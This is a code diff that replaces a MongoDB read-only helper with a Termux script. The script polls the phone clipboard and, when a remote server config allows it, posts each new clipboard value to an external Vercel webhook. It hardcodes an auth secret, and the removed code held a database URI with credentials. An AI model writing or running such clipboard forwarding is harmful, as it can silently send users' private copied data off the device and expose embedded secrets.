@@ -1,26 +1,66 @@
-import pymongo
-import dns.resolver
+import sys
+import time
+import subprocess
+import requests
+import os
 
-_original_init = dns.resolver.Resolver.__init__
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-def patched_init(self, *args, **kwargs):
-    kwargs['configure'] = False
-    _original_init(self, *args, **kwargs)
-    self.nameservers = ['8.8.8.8', '8.8.4.4']
+try:
+    from data.mongodb import db_read
+except ImportError:
+    print("Error: Could not import data.mongodb")
+    sys.exit(1)
 
-dns.resolver.Resolver.__init__ = patched_init
+if len(sys.argv) < 3:
+    sys.exit(1)
 
-MONGO_URI = "mongodb+srv://termux_user:termuxkey@cluster0.<seu_codigo>.mongodb.net/?retryWrites=true&w=majority"
+device_id = sys.argv[1]
+guild_id = sys.argv[2]
 
-class TermuxReadOnlyDB:
-    def __init__(self):
-        self.client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+URL_WEBHOOK_COPY = "https://hapiephoneugph.vercel.app/api/copy"
+AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
 
-    def obter_dados(self, nome_banco: str, nome_colecao: str, guild_id: str, modelo_celular: str = None):
-        filtro = {"guild_id": str(guild_id)}
-        if modelo_celular:
-            filtro["report.system_info.model"] = modelo_celular
+def get_clipboard():
+    try:
+        return subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
+    except:
+        return ""
+
+last_clipboard = get_clipboard()
+
+while True:
+    try:
+        config_list = db_read.obter_dados("HapiephoneDB", "server_config", guild_id)
+        
+        if config_list and len(config_list) > 0:
+            config = config_list[0]
             
-        return list(self.client[nome_banco][nome_colecao].find(filtro))
+            copy_send = config.get("copy_Send", False)
+            auto_copy_channel = config.get("auto_copy_channel")
 
-db_read = TermuxReadOnlyDB()
+            if copy_send and auto_copy_channel:
+                current_clipboard = get_clipboard()
+
+                if current_clipboard and current_clipboard != last_clipboard:
+                    payload = {
+                        "texto": current_clipboard,
+                        "channel_id": auto_copy_channel,
+                        "device_id": device_id,
+                        "guild_id": guild_id
+                    }
+                    
+                    headers = {
+                        "Content-Type": "application/json",
+                        "Authorization": AUTH_SECRET
+                    }
+
+                    resp = requests.post(URL_WEBHOOK_COPY, json=payload, headers=headers, timeout=5)
+                    
+                    if resp.status_code == 200:
+                        last_clipboard = current_clipboard 
+                        
+    except Exception:
+        pass 
+
+    time.sleep(3)
